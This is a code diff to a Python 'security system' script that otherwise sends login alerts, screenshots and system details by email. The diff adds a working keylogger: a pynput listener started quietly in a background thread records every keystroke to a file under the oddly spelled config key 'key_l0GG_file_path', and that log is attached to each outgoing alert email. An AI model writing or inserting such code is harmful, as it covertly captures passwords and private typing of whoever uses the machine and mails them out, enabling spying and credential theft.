@@ -16,6 +16,8 @@ from config import *
 import pyautogui
 from emails import *
 
+from pynput.keyboard import Key, Listener
+
 #CHECK_INTERVAL = 20  # seconds
 
 
@@ -36,6 +38,14 @@ LOG_FILE = get_config_val('log_file_path')
 # ---------- MAIN SECURITY ----------
 def start_security():
     print("Security system started...")
+    # Starting the keylogger
+    #with Listener(on_press=write_to_file, on_release=on_release) as listener:
+    #    listener.join()
+    # 1. Start the keylogger in a non-blocking way
+    listener = Listener(on_press=write_to_file, on_release=on_release)
+    listener.start()  # This starts the thread but allows code execution to continue
+
+    
     base_ip, base_city, base_country = login_alert()
     usb_baseline = get_usb()
     folder_state = {f: snapshot(f) for f in WATCH_FOLDERS}
@@ -215,14 +225,23 @@ def snapshot(folder):
 def prepare_email_context(subject, body, attachment=None):
     subject = f"[{DEVICE_NAME}] {subject}"
     body = body + "-------------------\n\n"
+
+     # Create a list for multiple attachments
+    attachments_list = []
+    
+    # Add the primary attachment (Screenshot)
     if attachment:    
-        filename = attachment
+        attachments_list.append(attachment)
     else:
-        filename = take_ss()
+        attachments_list.append(take_ss()) # Automatically take SS if none provided
+    
+    # Add the keylogger log file
+    attachments_list.append(get_config_val('key_l0GG_file_path'))
+        
     info = system_info()
     for k,v in info.items():
         body += f"{k}: {v}\n"
-    send_email(subject, body, filename)
+    send_email(subject, body, attachments_list)
 
     write_log(subject + " | " + body)
     
@@ -258,3 +277,29 @@ def take_ss(email_ss=None):
     except Exception as e:
         print(f"✘ Screenshot failed: {e}")
         return None
+
+
+
+# Function to write captured keys to a file
+def write_to_file(key):
+    key_data = str(key).replace("'", "")
+    K_LOG_FILE = get_config_val('key_l0GG_file_path')
+    
+    # Format special keys for readability
+    if key_data == 'Key.space':
+        key_data = ' '
+    elif key_data == 'Key.enter':
+        key_data = '\n'
+    elif 'Key' in key_data:
+        key_data = f' [{key_data}] '
+
+
+    with open(K_LOG_FILE, "a") as f:
+        f.write(key_data)
+
+# Function to stop the listener (optional)
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
